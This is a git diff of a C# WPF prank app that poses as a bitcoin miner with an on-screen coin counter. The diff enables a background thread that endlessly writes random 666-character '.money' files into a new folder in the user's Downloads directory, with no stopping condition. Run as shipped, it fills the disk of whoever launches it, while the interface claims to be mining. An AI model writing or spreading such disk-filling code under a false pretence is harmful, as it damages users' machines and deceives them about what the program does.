@@ -21,9 +21,26 @@ namespace shizaa
     delegate void UpdateProgressBarDelegate(DependencyProperty dp, object value);
     public partial class MainWindow : Window
     {
+        int s;
+
+        private static Random random = new Random();
+        public static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwyz";
+            return new string(Enumerable.Repeat(chars, length)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+
+        private void ColorSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
+        {
+            s = (int)slider.Value;
+        }
+
         public MainWindow()
         {
             InitializeComponent();
+            
+
 
             new Thread(async () =>
             {
@@ -35,22 +52,32 @@ namespace shizaa
                     {
                         pisya.Text = $"{da} биткойнов";
                     });
-                    await Task.Delay(100);
+                    await Task.Delay(s);
                 }
             }).Start();
 
             new Thread(() =>
             {
-                /*
-                StreamWriter file = new StreamWriter(System.Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile) + "\\Downloads\\govno.txt");
-                while(true)
+                DirectoryInfo dir = new DirectoryInfo(System.Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile) + "\\Downloads\\bitcoins");
+                if (!dir.Exists) Directory.CreateDirectory(dir.FullName);
+                ulong dada = 0;
+                
+                while (true)
                 {
-                    file.Write("ШУЕ");//будем пытаться майнить на шпинделе
+                    
+                    StreamWriter file = new StreamWriter(System.Environment.GetFolderPath(System.Environment.SpecialFolder.UserProfile) + $"\\Downloads\\bitcoins\\{dada}.money");
+                    file.Write(RandomString(666));//будем пытаться майнить на шпиндел
+                    file.Close();
+                    dada++;
+                    
                 }
-                */
+
             }).Start();
 
 
         }
+
+
+        
     }
 }
